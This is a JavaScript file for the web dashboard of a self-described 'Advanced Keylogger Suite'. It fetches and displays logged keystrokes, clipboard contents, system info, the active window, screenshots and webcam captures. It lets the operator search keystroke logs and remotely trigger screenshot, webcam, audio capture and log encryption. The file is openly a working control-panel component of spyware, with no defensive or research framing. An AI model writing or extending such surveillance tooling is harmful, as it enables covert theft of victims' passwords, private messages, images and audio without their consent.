/* ===================================================================
   Project: Advanced Keylogger Suite - Web Dashboard Interactivity
   Author: Avi
   =================================================================== */

document.addEventListener("DOMContentLoaded", () => {
    // Navigation Tabs
    const navItems = document.querySelectorAll(".nav-item");
    const tabContents = document.querySelectorAll(".tab-content");
    const headerTitle = document.getElementById("header-title");

    navItems.forEach(item => {
        item.addEventListener("click", () => {
            const targetTab = item.getAttribute("data-tab");
            
            navItems.forEach(nav => nav.classList.remove("active"));
            tabContents.forEach(tab => tab.classList.remove("active"));

            item.classList.add("active");
            const targetElement = document.getElementById(`tab-${targetTab}`);
            if (targetElement) {
                targetElement.classList.add("active");
            }

            headerTitle.textContent = item.innerText.trim();
            loadTabData(targetTab);
        });
    });

    // Auto-refresh timer
    setInterval(fetchStats, 3000);
    fetchStats();
    loadOverviewData();

    // Refresh Button
    document.getElementById("btn-refresh").addEventListener("click", () => {
        const activeTab = document.querySelector(".nav-item.active").getAttribute("data-tab");
        fetchStats();
        loadTabData(activeTab);
    });

    // Triggers
    setupTriggers();
    setupModal();
    setupSearch();
});

// Fetch Engine Stats & Metrics
function fetchStats() {
    fetch("/api/stats")
        .then(res => res.json())
        .then(data => {
            document.getElementById("stat-keystrokes").innerText = data.total_keystrokes || 0;
            document.getElementById("stat-screenshots").innerText = data.screenshots_count || 0;
            document.getElementById("stat-webcam").innerText = data.webcam_count || 0;
            document.getElementById("stat-audio").innerText = data.audio_count || 0;

            const activeWin = document.getElementById("active-window-text");
            if (activeWin) {
                activeWin.innerText = data.active_window || "System";
            }

            const statusText = document.getElementById("engine-status-text");
            const statusDot = document.getElementById("engine-status-dot");
            if (statusText) statusText.innerText = data.status;
            if (statusDot) {
                if (data.status === "Active") {
                    statusDot.style.background = "#10b981";
                    statusDot.style.boxShadow = "0 0 10px #10b981";
                } else {
                    statusDot.style.background = "#ef4444";
                    statusDot.style.boxShadow = "0 0 10px #ef4444";
                }
            }
        })
        .catch(err => console.error("Stats fetch error:", err));
}

// Load Tab Specific Data
function loadTabData(tab) {
    if (tab === "overview") loadOverviewData();
    else if (tab === "keystrokes") loadKeystrokesData();
    else if (tab === "screenshots") loadGalleryData("screenshots", "screenshots-gallery");
    else if (tab === "webcam") loadGalleryData("webcam", "webcam-gallery");
    else if (tab === "clipboard") loadClipboardData();
    else if (tab === "system") loadSystemInfoData();
}

function loadOverviewData() {
    fetch("/api/logs/keystrokes")
        .then(res => res.json())
        .then(data => {
            const lines = (data.content || "").split("\n");
            const recent = lines.slice(-25).join("\n");
            document.getElementById("recent-keys-preview").textContent = recent || "No logs available.";
        });

    fetch("/api/logs/clipboard")
        .then(res => res.json())
        .then(data => {
            document.getElementById("recent-clipboard-preview").textContent = data.content || "No clipboard logs.";
        });
}

function loadKeystrokesData() {
    fetch("/api/logs/keystrokes")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("full-keystrokes-log");
            elem.textContent = data.content || "No keystrokes recorded.";
            elem.scrollTop = elem.scrollHeight;
        });
}

function loadClipboardData() {
    fetch("/api/logs/clipboard")
        .then(res => res.json())
        .then(data => {
            const elem = document.getElementById("full-clipboard-log");
            elem.textContent = data.content || "No clipboard logs.";
            elem.scrollTop = elem.scrollHeight;
        });
}

function loadSystemInfoData() {
    fetch("/api/logs/system")
        .then(res => res.json())
        .then(data => {
            document.getElementById("full-system-info").textContent = data.content || "System info loading...";
        });
}

function loadGalleryData(category, containerId) {
    fetch(`/api/gallery/${category}`)
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById(containerId);
            container.innerHTML = "";

            if (!data.files || data.files.length === 0) {
                container.innerHTML = `<p class="empty-msg">No ${category} captured yet.</p>`;
                return;
            }

            data.files.forEach(file => {
                const card = document.createElement("div");
                card.className = "gallery-card";
                card.innerHTML = `
                    <img src="${file.url}" alt="${file.filename}" loading="lazy">
                    <div class="gallery-info">
                        <span>${file.filename}</span>
                        <span>${file.size_kb} KB</span>
                    </div>
                `;
                card.addEventListener("click", () => openModal(file.url, file.filename));
                container.appendChild(card);
            });
        });
}

function setupTriggers() {
    const triggers = [
        { id: "trigger-screenshot", action: "screenshot", label: "Screenshot captured!" },
        { id: "trigger-webcam", action: "webcam", label: "WebCam snap taken!" },
        { id: "trigger-audio", action: "audio", label: "Audio clip recorded!" },
        { id: "trigger-encrypt", action: "encrypt", label: "Logs encrypted successfully!" }
    ];

    triggers.forEach(t => {
        const btn = document.getElementById(t.id);
        if (btn) {
            btn.addEventListener("click", () => {
                btn.disabled = true;
                btn.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Processing...`;

                fetch(`/api/trigger/${t.action}`, { method: "POST" })
                    .then(res => res.json())
                    .then(data => {
                        btn.disabled = false;
                        btn.innerHTML = t.label;
                        fetchStats();
                        setTimeout(() => {
                            btn.innerText = btn.getAttribute("data-orig") || t.id.replace("trigger-", "").toUpperCase();
                        }, 2500);
                    })
                    .catch(err => {
                        btn.disabled = false;
                        alert("Trigger failed or module unsupported.");
                    });
            });
        }
    });
}

function setupModal() {
    const modal = document.getElementById("image-modal");
    const closeBtn = document.getElementById("modal-close");
    const overlay = document.querySelector(".modal-overlay");

    if (closeBtn) closeBtn.addEventListener("click", closeModal);
    if (overlay) overlay.addEventListener("click", closeModal);
}

function openModal(url, caption) {
    const modal = document.getElementById("image-modal");
    const modalImg = document.getElementById("modal-img");
    const modalCap = document.getElementById("modal-caption");

    modalImg.src = url;
    modalCap.textContent = caption;
    modal.classList.add("active");
}

function closeModal() {
    const modal = document.getElementById("image-modal");
    modal.classList.remove("active");
}

function setupSearch() {
    const searchInput = document.getElementById("search-keystrokes");
    if (!searchInput) return;

    searchInput.addEventListener("input", (e) => {
        const query = e.target.value.toLowerCase();
        const logElem = document.getElementById("full-keystrokes-log");
        const fullText = logElem.textContent;

        if (!query) {
            loadKeystrokesData();
            return;
        }

        const lines = fullText.split("\n");
        const filtered = lines.filter(line => line.toLowerCase().includes(query));
        logElem.textContent = filtered.join("\n");
    });
}
